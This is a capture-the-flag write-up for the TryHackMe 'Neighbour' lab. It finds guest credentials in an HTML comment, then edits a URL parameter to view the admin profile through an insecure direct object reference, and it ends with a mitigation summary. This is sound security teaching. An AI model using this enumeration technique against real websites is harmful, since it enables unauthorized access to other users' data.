# TryHackMe Write-up: Neighbour

**Machine Name:** Neighbour  
**Difficulty:** Easy  
**IP Address:** `10.10.53.160`  
**Description:** "Check out our new cloud service, Authentication Anywhere. Can you find other user's secrets?"

---

## Reconnaissance

Upon visiting the IP address in the browser:

```
http://10.10.53.160
```

I was presented with a login form. Underneath the form, a hint was provided:

> _"Don't have an account? Use the guest account! (Ctrl+U)"_

## Source Code Inspection

By pressing `Ctrl+U`, I opened the source code of the page:

```
view-source:http://10.10.53.160/login.php
```

Inside the HTML, a comment revealed test credentials:

```html
<!-- use guest:guest credentials until registration is fixed -->
```

## Authentication

I returned to the login page and logged in using:

- **Username:** `guest`
- **Password:** `guest`

After submitting the credentials, I was redirected to:

```
http://10.10.53.160/profile.php?user=guest
```

This page displayed the following message:

> _"Hi, guest. Welcome to our site. Try not to peep your neighbor's profile."_

## Exploitation: IDOR (Insecure Direct Object Reference)

Noticing that the `user` parameter was passed via the URL, I attempted to enumerate other usernames.

Changing the URL to:

```
http://10.10.53.160/profile.php?user=admin
```

successfully displayed the profile page for the `admin` user, along with the flag:

> _"Hi, admin. Welcome to your site. The flag is: **....{..............}**"_

## Vulnerability Summary

- **Issue:** Insecure Direct Object Reference (IDOR)
- **Impact:** Unauthorized access to other users’ profile data
- **Mitigation:** Access control should be enforced on the server-side to verify if the requesting user is authorized to access the requested profile.

---


